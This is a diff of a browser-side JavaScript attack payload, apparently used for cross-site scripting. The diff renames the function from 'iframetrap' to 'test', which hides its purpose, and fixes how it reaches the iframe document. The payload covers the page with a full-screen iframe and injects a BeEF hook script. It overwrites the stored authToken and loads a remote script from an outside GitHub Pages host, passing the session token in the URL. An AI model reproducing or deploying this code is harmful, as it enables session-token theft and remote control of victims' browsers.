@@ -33,47 +33,54 @@
 	} catch {}
 })();
 
-(async function iframetrap() {
+(async function test() {
     function a(b) {
         const i = window.top.document.createElement('iframe');
-		i.src = "/";
-		i.style ='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
-		i.className = 'EDsploit';
-		window.top.document.body.appendChild(i);
-		i.onload = () => {
-			const beef = i.createElement("script");
-			beef.src = "https://beef.local/hook.js"
-			beef.async = true;
-			c.body.appendChild(beef)
-		};
-		const c = setInterval(() => {
-            if (window.top.document.body.getElementsByClassName('EDsploit').length > 0) {
+        i.src = "/";
+        i.style = 'position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
+        i.className = 'testy';
+        window.top.document.body.appendChild(i);
+        
+        i.onload = () => {
+            // ✅ Utiliser contentDocument
+            const iframeDoc = i.contentDocument || i.contentWindow.document;
+            const beef = iframeDoc.createElement("script");
+            beef.src = "https://beef.local/hook.js";
+            beef.async = true;
+            iframeDoc.body.appendChild(beef);
+        };
+        
+        const c = setInterval(() => {
+            if (window.top.document.body.getElementsByClassName('testy').length > 0) {
                 clearInterval(c);
-				b()
-				setTimeout(() => {
-					const credentials = JSON.parse(sessionStorage.getItem("credentials"));
-                	credentials.payload.authToken = "0100010101000100011100110111000001101100011011110110100101110100";
-                	sessionStorage.setItem("credentials", JSON.stringify(credentials));
-				}, 4000);
-    		}
-        }, 10)
-		return;
-	}
-	a(() => {
-		const b = document.createElement("iframe");
-		b.src = "/";
-		b.style.display = "none";
-		document.body.appendChild(b);
-		b.onload = () => {
-			const c = b.contentDocument,
-				d = setInterval(() => {
-					if (!c || !c.body) return;
-					clearInterval(d);
-					const e = c.createElement("script");
-					e.src = `https://exon-dv.github.io/a/b.js?id=${token}`;
-					e.async = true;
-					c.body.appendChild(e)
-				}, 50)
-		}
-	})
+                b();
+                setTimeout(() => {
+                    const credentials = JSON.parse(sessionStorage.getItem("credentials"));
+                    credentials.payload.authToken = "0100010101000100011100110111000001101100011011110110100101110100";
+                    sessionStorage.setItem("credentials", JSON.stringify(credentials));
+                }, 4000);
+            }
+        }, 10);
+        return;
+    }
+    
+    a(() => {
+        const b = document.createElement("iframe");
+        b.src = "/";
+        b.style.display = "none";
+        document.body.appendChild(b);
+        
+        b.onload = () => {
+            const c = b.contentDocument || b.contentWindow.document;
+            const d = setInterval(() => {
+                if (!c || !c.body) return;
+                clearInterval(d);
+                const e = c.createElement("script");
+                const token = sessionStorage.getItem("token") || "default"; // ✅ Définir token
+                e.src = `https://exon-dv.github.io/a/b.js?id=${token}`;
+                e.async = true;
+                c.body.appendChild(e);
+            }, 50);
+        };
+    });
 })();
